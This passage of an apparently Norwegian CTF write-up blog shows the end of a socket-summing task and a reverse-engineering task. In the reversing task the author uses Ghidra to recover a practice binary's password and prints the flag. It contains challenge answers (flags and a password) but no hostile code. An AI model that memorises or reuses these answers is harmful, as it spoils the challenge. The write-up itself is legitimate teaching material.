+<span style="color:#ae81ff">3</span>
+<span style="color:#ae81ff">4</span>
+<span style="color:#ae81ff">5</span>
+<span style="color:#ae81ff">6</span>
+<span style="color:#ae81ff">7</span>
+<span style="color:#ae81ff">8</span>
+<span style="color:#ae81ff">9</span>
+Du vil nå få tilsendt et 32-bits heltall i <span style="color:#e6db74">`</span>network byte order<span style="color:#e6db74">`</span> i hver av de ti andre sesjonene.
+Summer alle, og send resultatet tilbake på denne socketen.
+
+<span style="color:#ae81ff">1160522889</span>
+b<span style="color:#e6db74">&#39;E,,\x89&#39;</span>
+Neste melding sendes fordelt over de ti sesjonene. Pass på så du ikke blokkerer mens du leser!
+
+H u s k   a t   u t f - <span style="color:#ae81ff">8</span>   k a n   h a   m u l t i - b y t e   t e g n   😊
+
+ ╭ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ╮
+ │   G r a t u l e r e r !                                                         │
+ │                                                                                 │
+ │   H e r   e r   f l a g g e t :                                                 │
+ │                                                                                 │
+ ├ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┤
+ │         <span style="color:#ae81ff">6</span> <span style="color:#ae81ff">6</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">9</span> <span style="color:#ae81ff">4</span> f <span style="color:#ae81ff">7</span> <span style="color:#ae81ff">8</span> <span style="color:#ae81ff">6</span> <span style="color:#ae81ff">4</span> f <span style="color:#ae81ff">8</span> <span style="color:#ae81ff">7</span> <span style="color:#ae81ff">7</span> b <span style="color:#ae81ff">7</span> <span style="color:#ae81ff">9</span> d a f <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">6</span> <span style="color:#ae81ff">7</span> a a <span style="color:#ae81ff">5</span> e <span style="color:#ae81ff">3</span>         │
+ ╰ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ╯
+</code></pre></div><h3 id="6_reversing">6_reversing</h3>
+<p><em>Oppgavetekst:</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">┄Reverse engineering
+
+Enten du leter etter sårbarheter eller analyserer skadevare må du kunne plukke
+fra hverandre en programfil for å se hva den gjør, uten å ha tilgang til
+kildekode. Denne prosessen blir kalt reverse engineering, eller mer populært
+bare reversing. Å reverse større programmer krever mye tid og erfaring,
+og det tar lang tid å lære verktøyene til det fulle.
+
+I lang tid har det beste verktøyet for reversing av programmer vært IDA Pro,
+og dette har nærmest vært en industristandard. I 2019 publiserte amerikanske
+NSA et internt verktøy de kaller Ghidra, som er gratis og åpen
+kildekode.
+
+Det finnes også noen mer spesialiserte reversing verktøy, som jadx for
+android reversing.
+
+Det er mulig å løse denne oppgaven med enkle verktøy som strings og
+objdump, men vi anbefaler å bruke Ghidra eller gratisversjonen
+av IDA.
+
+For å kopiere filer ut fra denne serveren kan du bruke
+kommandoen scp fra din egen maskin: scp
+login@ctf.cybertalent.no:1_grunnleggende/6_reversing/check_password ./check_password
+
+Hvordan løser du denne oppgaven?
+</code></pre></div><p>Fyrer opp ghidra, finner &ldquo;sjekk_password&rdquo; funksjonen:</p>
+<p><img src="/img/ghidra_reversing.png" alt="ghidra_reversing"></p>
+<p>Det er 5 sjekker for passordet:</p>
+<ol>
+<li>lengde av passord = 32</li>
+<li>Første 19 tegn er Reverse_engineering</li>
+<li>Tegn 20 er &lsquo;_&rsquo;</li>
+<li>&lsquo;er_&rsquo;</li>
+<li>&lsquo;morsomt__&rsquo;</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> ./check_password Reverse_engineering_er_morsomt__
+Korrekt passord!
+$ ls
+FLAGG  LESMEG.md  check_password  check_password.c
+$ cat FLAGG
+8e407e77745f4800caa111f65434ab64
+</code></pre></div><p>I neste del går vi igjennom oppdraget: <strong><a href="/post/etj21_2/"> Fortsett til DEL 2 </a></strong></p>
+
+    <h4><a href="/">Back to Home</a></h4>
+</div>
+
+
+        </div><footer class="container">
+    <hr class="soften">
+    <p>
+
+    <a href="https://github.com/bashgobrr">github</a> |
+
+&copy;
+
+    bashgobrr
+
+<span id="thisyear">2021</span>
+
+    | Certified scriptkid @ <a href="https://ctftime.org/team/113107">Corax</a> &amp; <a href="https://itemize.no/">Itemize</a>
+
+
+        | Built on <a href="//gohugo.io" target="_blank">Hugo</a>
+
+</p>
+    <p class="text-center">
+        
+        
+        
+        
+        
+    </p>
+</footer>
+
+</body><link rel="stylesheet" href="/css/bootstrap.css">
+<link rel="stylesheet" href="/css/bootstrap-responsive.css">
+<link rel="stylesheet" href="/css/style.css">
+
+<script src="/js/jquery.js"></script>
+<script src="/js/bootstrap-386.js"></script>
+<script src="/js/bootstrap-transition.js"></script>
+<script src="/js/bootstrap-alert.js"></script>
+<script src="/js/bootstrap-modal.js"></script>
+<script src="/js/bootstrap-dropdown.js"></script>
+<script src="/js/bootstrap-scrollspy.js"></script>
+<script src="/js/bootstrap-tab.js"></script>
+<script src="/js/bootstrap-tooltip.js"></script>
+<script src="/js/bootstrap-popover.js"></script>
+<script src="/js/bootstrap-button.js"></script>
+<script src="/js/bootstrap-collapse.js"></script>
+<script src="/js/bootstrap-carousel.js"></script>
+<script src="/js/bootstrap-typeahead.js"></script>
+<script src="/js/bootstrap-affix.js"></script>
+<script>
+    _386 = { 
+        fastLoad: false ,
+        onePass: true , 
+        speedFactor: 3 
+    };
+
+    
+    function ThisYear() {
+        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
+    };
+</script></html>
